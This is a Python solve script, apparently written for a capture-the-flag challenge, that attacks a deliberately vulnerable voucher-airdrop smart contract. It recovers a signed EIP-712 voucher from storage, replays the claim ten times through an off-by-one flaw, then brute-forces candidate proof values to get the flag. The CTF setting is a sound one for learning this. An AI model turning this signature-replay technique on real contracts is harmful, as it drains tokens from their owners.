#!/usr/bin/env python3
"""
Voucher Window — runbook manual verboso (uma instância nova, do zero à flag).
Uso:
    1. No navegador logado: abra o desafio, clique "Acessar" (gera instância e seta cookie).
       DevTools -> Application -> Cookies -> copie o valor de hik_team.
    2. python3 runbook.py 'hik_team=SEU_COOKIE_AQUI'

Faz: instance.json -> deriva Token/Drop -> recon on-chain -> solve (10x claim) ->
     isSolved -> GET /ticket (full) -> POST /flag (full, varrendo candidatos de proof).
Mostra TODO output cru pra inspeção. cast só é usado nos sends (assina com a pk da instância).
"""
import sys, json, subprocess, hashlib, time, urllib.request, urllib.error
from Crypto.Hash import keccak

COOKIE = sys.argv[1] if len(sys.argv) > 1 else sys.exit("uso: python3 runbook.py 'hik_team=...'")
BASE = "https://<HOST>"
RPC  = "https://<HOST>"
CAST = "/home/felipebc2/.config/.foundry/bin/cast"

def hr(t): print("\n" + "="*70 + f"\n## {t}\n" + "="*70)
def kec(b):
    h = keccak.new(digest_bits=256); h.update(b); return h.digest()

def http(path, data=None, show_headers=False):
    req = urllib.request.Request(BASE+path, data=data,
          headers={"Cookie": COOKIE, "Content-Type": "application/json"})
    try:
        r = urllib.request.urlopen(req, timeout=20)
        body = r.read().decode("utf-8","replace")
        if show_headers:
            print(f"   HTTP {r.status}  headers={dict(r.headers)}")
        return r.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8","replace")
        if show_headers:
            print(f"   HTTP {e.code}  headers={dict(e.headers)}")
        return e.code, body

def rpc(method, params):
    p = {"jsonrpc":"2.0","id":1,"method":method,"params":params}
    req = urllib.request.Request(RPC, data=json.dumps(p).encode(),
          headers={"Content-Type":"application/json"})
    return json.loads(urllib.request.urlopen(req, timeout=20).read().decode())

def create_addr(sender, nonce):
    s = bytes.fromhex(sender[2:])
    n = b"\x80" if nonce==0 else (bytes([nonce]) if nonce<0x80 else None)
    body = b"\x94"+s+n
    return "0x"+kec(bytes([0xc0+len(body)])+body)[12:].hex()

# ------------------------------------------------------------------ 1. instance
hr("1. GET /instance.json")
st, body = http("/instance.json", show_headers=True)
print(body)
inst = json.loads(body)
PLAYER = inst["player"]; PK = inst["playerPrivateKey"]; SETUP = inst["contracts"]["setup"]
print(f"\n   player={PLAYER}\n   setup ={SETUP}")

# ------------------------------------------------------------------ 2. derive
hr("2. Deriva Token/Drop (CREATE do Setup: nonce1=Token, nonce2=Drop)")
TOKEN = create_addr(SETUP, 1); DROP = create_addr(SETUP, 2)
print(f"   TOKEN = {TOKEN}\n   DROP  = {DROP}")

# ------------------------------------------------------------------ 3. recon
hr("3. Recon on-chain")
def call(to, data):
    r = rpc("eth_call",[{"to":to,"data":data},"latest"]); return r.get("result","<err:%s>"%r.get("error"))
def selector(sig): return "0x"+kec(sig.encode())[:4].hex()
def storage(addr, slot): return rpc("eth_getStorageAt",[addr, hex(slot), "latest"])["result"]

print("   setup.player() =", call(SETUP, selector("player()")))
print("   setup.signer() =", call(SETUP, selector("signer()")))
print("   setup.token()  =", call(SETUP, selector("token()")))
print("   setup.isSolved =", call(SETUP, selector("isSolved()")))
print("   token.name     =", call(TOKEN, selector("name()")))
print("   token.symbol   =", call(TOKEN, selector("symbol()")))
print("   token.totalSupply =", int(call(TOKEN, selector("totalSupply()")),16))
bal = lambda a: int(call(TOKEN, selector("balanceOf(address)")+a[2:].rjust(64,"0")),16)
print(f"   bal player = {bal(PLAYER)}")
print(f"   bal drop   = {bal(DROP)}")
print("   drop.DOMAIN_SEPARATOR =", call(DROP, selector("DOMAIN_SEPARATOR()")))
print("   drop.CLAIM_TYPEHASH   =", call(DROP, selector("CLAIM_TYPEHASH()")))

hr("3b. Voucher (Setup storage slots 0,1,2 = v, r, s)")
v = int(storage(SETUP,0),16); R = storage(SETUP,1); S = storage(SETUP,2)
AMT = 100*10**18; NONCE = 0
print(f"   v={v}  r={R}  s={S}\n   amount={AMT} (100e18, constante)  nonce={NONCE}")
# sanity: ecrecover do digest EIP-712 bate no signer?
DS=bytes.fromhex(call(DROP,selector("DOMAIN_SEPARATOR()"))[2:])
TH=bytes.fromhex(call(DROP,selector("CLAIM_TYPEHASH()"))[2:])
to32=bytes(12)+bytes.fromhex(PLAYER[2:])
sh=kec(TH+to32+AMT.to_bytes(32,"big")+NONCE.to_bytes(32,"big"))
digest=kec(b"\x19\x01"+DS+sh)
rec=call("0x0000000000000000000000000000000000000001",
         "0x"+(digest+v.to_bytes(32,"big")+bytes.fromhex(R[2:])+bytes.fromhex(S[2:])).hex())
print(f"   EIP-712 digest = 0x{digest.hex()}")
print(f"   ecrecover      = 0x{rec[-40:]}  (deve == setup.signer)")

# ------------------------------------------------------------------ 4. solve
hr("4. Solve: 10x Drop.claim (off-by-one replay)")
if call(SETUP, selector("isSolved()")).endswith("1"):
    print("   JÁ resolvido (isSolved=true) — pulando sends.")
else:
    for i in range(1,11):
        cmd=[CAST,"send",DROP,"claim(uint256,uint256,uint8,bytes32,bytes32)",
             str(AMT),"0",str(v),R,S,"--private-key",PK,"--rpc-url",RPC]
        out=subprocess.run(cmd,capture_output=True,text=True)
        print(f"   claim #{i}: rc={out.returncode} {out.stdout.strip()[:60]} {out.stderr.strip()[:80]}")

hr("4b. Confirma")
print("   bal player =", bal(PLAYER), " isSolved =", call(SETUP, selector("isSolved()")))

# ------------------------------------------------------------------ 5. ticket
hr("5. GET /ticket (resposta + headers completos)")
st, tbody = http("/ticket", show_headers=True)
print("  ", tbody)
ticket = json.loads(tbody)["ticket"]

# ------------------------------------------------------------------ 6. flag
hr("6. POST /flag — varre candidatos de proof (resposta + headers)")
player_lc = PLAYER[2:].lower(); signer_lc = call(SETUP,selector("signer()"))[-40:]
cands = [
 ("player_lc", player_lc),
 ("signer_lc", signer_lc),
 ("balance_dec", str(bal(PLAYER))),
 ("balance_hex", "%x"%bal(PLAYER)),
 ("digest", digest.hex()),
 ("zero", "0"),
 ("thousand", "1000"),
]
for label, proof in cands:
    st, tbody = http("/ticket")
    ticket = json.loads(tbody)["ticket"]
    tok = hashlib.sha256(f"{ticket}:{proof}".encode()).hexdigest()
    st, fbody = http("/flag", json.dumps({"ticket":ticket,"token":tok}).encode(),
                     show_headers=(label=="player_lc"))
    hit = "HIK_" in fbody
    print(f"   [{label:12}] proof={proof[:28]:28} -> HTTP {st} {fbody}{'   <<< FLAG' if hit else ''}")
    if hit: print("\n### FLAG ENCONTRADA ###"); break
    time.sleep(0.3)
